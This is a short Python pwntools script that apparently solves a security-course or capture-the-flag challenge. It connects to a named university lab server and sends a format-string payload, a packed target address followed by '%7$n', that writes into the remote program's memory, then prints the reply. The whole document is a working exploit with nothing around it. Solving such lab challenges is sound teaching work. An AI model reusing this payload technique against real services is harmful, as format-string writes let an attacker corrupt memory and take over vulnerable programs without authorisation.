from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22192

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'\x40\xa0\x04\x08.%7$n')
print(s.recv(512))